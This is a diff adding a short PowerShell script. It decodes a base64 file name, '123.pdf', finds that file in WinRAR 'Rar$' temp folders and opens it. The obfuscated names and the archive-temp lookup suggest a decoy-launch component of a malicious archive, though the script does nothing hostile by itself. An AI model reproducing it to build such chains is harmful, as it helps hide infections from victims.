@@ -1,0 +1,59 @@
+do {
+    # Function for Base64 encoding
+    function f0 {
+        param ($str)
+        # Convert string to UTF-8 bytes, then to Unicode bytes, and finally to Base64 string
+        return [System.Convert]::ToBase64String([System.Text.Encoding]::Convert([System.Text.Encoding]::UTF8,[System.Text.Encoding]::Unicode,[System.Text.Encoding]::Default.GetBytes($str)));
+    }
+
+    # Function for document processing
+    function f1 {
+        param ([string] $documentName)
+        # Returns -1 if input string is null or empty
+        if ((!$documentName) -or ($documentName.Length -eq 0)) {
+            return -1;
+        }
+        # Decodes the Base64-encoded document name
+        $docName = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($documentName));
+        $rarDirSign = 'Rar$';
+        # Gets list of directories in TEMP directory starting with 'Rar$'
+        $rarDirs = (Get-ChildItem -Path $env:TEMP -Include ($rarDirSign + '*') -Depth 0 -ErrorAction SilentlyContinue);
+        $docDirs = $null;
+        # Returns -2 if no directories found in TEMP
+        if (!$rarDirs) {
+            return -2;
+        }
+        # Searches for directories containing the decoded document name and 'Rar$' in their full name
+        foreach ($rarDir in $rarDirs) {
+            $docDirs = ((Get-ChildItem -Path $rarDir.FullName -Include $docName -File -Depth 0 -ErrorAction SilentlyContinue) | Where-Object { $_.FullName.IndexOf($rarDirSign) -ne -1 });
+            if ($docDirs -and $docDirs.Length -gt 0) {
+                break;
+            }
+        }
+        # Returns -3 if no matching directories found
+        if (!$docDirs) {
+            return -3;
+        }
+        # Gets the full path of the first matching document
+        $docPath = $docDirs[0].FullName;
+        # Returns -4 if the document file does not exist
+        if (![System.IO.File]::Exists($docPath)) {
+            return -4;
+        }
+        try {
+            # Attempts to start the document process
+            Start-Process -FilePath $docPath;
+        } catch {
+            # Returns -5 if an error occurs during execution
+            return -5;
+        }
+        # Returns 0 if document processing is successful
+        return 0;
+    }
+
+    $docName = 'MwAyADEALgBwAGQAZgA='; # Base64-encoded document name '123.pdf'
+    # Calls function f1 with the Base64-encoded document name and stores the result
+    $r = f1($docName);
+    # Writes the output to the console
+    Write-Output('_m01tsfc: ' + $r);
+} while ($false);
